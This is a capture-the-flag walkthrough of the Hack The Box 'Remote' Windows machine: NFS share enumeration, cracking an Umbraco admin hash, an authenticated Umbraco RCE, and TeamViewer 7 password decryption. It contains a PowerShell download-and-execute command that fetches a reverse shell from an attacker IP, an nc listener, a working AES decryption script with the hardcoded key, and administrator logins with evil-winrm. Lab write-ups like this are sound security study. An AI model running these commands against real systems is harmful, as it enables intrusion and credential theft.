#Windows #NFS #Umbraco #CVE #RCE #credentialhunting #TeamViewer #AESDecryption #WinRM #PSExec

## Overview

Remote is an easy Windows box that demonstrates two distinct "credential in an unexpected place" findings. An NFS share exposed publicly lets anyone mount and browse a full site backup; inside is an Umbraco CMS database file containing a crackable SHA1 hash. Authenticating to Umbraco 7.12.4 and exploiting its authenticated RCE vulnerability grants a web shell. Root comes from TeamViewer 7 leftover registry keys that store the connection password AES-encrypted with a hardcoded key, decryptable in a short Python script.

## Recon

Nmap revealed an interesting combination: FTP (anonymous), HTTP, and NFS (RPC/mountd on 2049):

```sh
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
80/tcp   open  http          Microsoft HTTPAPI httpd 2.0
111/tcp  open  rpcbind       2-4
2049/tcp open  nfs
445/tcp  open  microsoft-ds
```

Anonymous FTP showed no accessible files. GoBuster on port 80 found the Umbraco CMS installation:

```sh
/install   (Status: 302) --> /umbraco/
/umbraco   (Status: 200)
/intranet  (Status: 200)
```

### NFS Share Enumeration

```sh
showmount -e 10.129.215.210
Export list for 10.129.215.210:
/site_backups (everyone)
```

> **NFS shares exported to "everyone":** NFS `(everyone)` means any host that can reach the port can mount the share with no authentication. This is a common misconfiguration on Windows when NFS is enabled for file sharing convenience; the administrator may not realize the exposure model differs from SMB.

Mounting it locally:

```sh
sudo mount -t nfs 10.129.215.210:/site_backups ~/mount/
ls ~/mount/
App_Browsers  App_Data  App_Plugins  Config  Global.asax  Media
Umbraco  Umbraco_Client  Views  Web.config  ...
```

## Foothold

### Cracking the Umbraco Admin Hash

Under `App_Data`, an Umbraco `.sdf` (SQL Server Compact) database file contained credential strings readable via `strings`:

```
Administratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}
```

Hash:

```
b8be16afba8c314ad33d812f22a04991b90e2aaa
```

```sh
john hash --wordlist=/usr/share/wordlists/rockyou.txt
‹redacted›     (?)
```

Credentials: `admin@htb.local:‹redacted›`

### Umbraco 7.12.4 Authenticated RCE

The Umbraco Help section confirmed version `7.12.4`, which has a publicly documented authenticated RCE (EDB-46153 and improved version EDB-49488). The exploit allows arbitrary command execution through a crafted XSLT transformation request:

```sh
python umbraco.py \
  -u admin@htb.local \
  -p ‹redacted› \
  -i http://10.129.215.210 \
  -c "powershell.exe" \
  -a "/c iex(new-object net.webclient).downloadstring('http://10.10.14.167/shell.ps1');"
```

The server fetched the Nishang shell and connected back:

```sh
rlwrap nc -lvnp 443
Windows PowerShell running as user REMOTE$ on REMOTE
PS C:\windows\system32\inetsrv> whoami
iis apppool\defaultapppool
```

User flag found in `C:\Users\Public\Desktop\`.

## Privilege Escalation

### TeamViewer 7 Registry Keys → Hardcoded AES Key

Browsing `C:\Users\Public\Desktop` also showed a `TeamViewer 7.lnk` shortcut. TeamViewer was installed:

```powershell
cd "\Program Files (x86)\TeamViewer"
```

TeamViewer stores connection passwords in the registry, encrypted. The Metasploit module `post/windows/gather/credentials/teamviewer_passwords` targets these keys. Without MSF (OSCP prep), the same logic was replicated manually.

Reading the Version7 registry key:

```powershell
cd HKLM:\software\wow6432node\teamviewer\version7
get-itemproperty .
# ...
SecurityPasswordAES : {255, 155, 28, 115, 214, 107, 206, 49, 172, 65, 62, 174,
                       19, 27, 70, 79, 88, 47, 108, 226, 209, 225, 243, 218,
                       126, 141, 55, 107, 38, 57, 78, 91}
```

> **TeamViewer's hardcoded AES key:** TeamViewer 7 encrypts stored passwords with AES-128-CBC using a static key and IV that are the same across all installations. The Metasploit module includes these constants; by replicating the decryption in Python, the password is recovered without running Metasploit at all. This is a published research finding, the key was extracted from the TeamViewer binary.

Python decryption:

```python
from Crypto.Cipher import AES

key = b"\x06\x02\x00\x00\x00\xa4\x00\x00\x52\x53\x41\x31\x00\x04\x00\x00"
iv  = b"\x01\x00\x01\x00\x67\x24\x4F\x43\x6E\x67\x62\xF2\x5E\xA8\xD7\x04"

ciphertext = bytes([255, 155, 28, 115, 214, 107, 206, 49, 172, 65, 62, 174,
                    19, 27, 70, 79, 88, 47, 108, 226, 209, 225, 243, 218,
                    126, 141, 55, 107, 38, 57, 78, 91])

aes = AES.new(key, AES.MODE_CBC, IV=iv)
password = aes.decrypt(ciphertext).decode("utf-16").rstrip("\x00")
print(f"[+] Found password: {password}")
# [+] Found password: ‹redacted›
```

Verified with NXC:

```sh
nxc smb 10.129.215.210 -u administrator -p '‹redacted›'
SMB [+] remote\administrator:‹redacted› (Pwn3d!)
```

## Root

```sh
evil-winrm -u administrator -p '‹redacted›' -i 10.129.215.210
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
remote\administrator

*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
‹redacted›
```

## Takeaways

- **NFS exported to "everyone" is equivalent to an anonymous SMB share.** Always run `showmount -e` against any host with RPC/NFS ports open.
- **Application backup directories expose the full source and database.** An Umbraco `.sdf` file read via `strings` yields password hashes; combined with a known vulnerable version, that is full RCE.
- **Installed software leaves credential artifacts.** TeamViewer, Filezilla, and similar tools store passwords in the registry or config files, often encrypted with keys that are public knowledge.
- **Replicating MSF module logic in Python avoids the tool restriction.** Reading the Ruby source for the TeamViewer module revealed the exact AES key and IV needed to decrypt without running Metasploit.
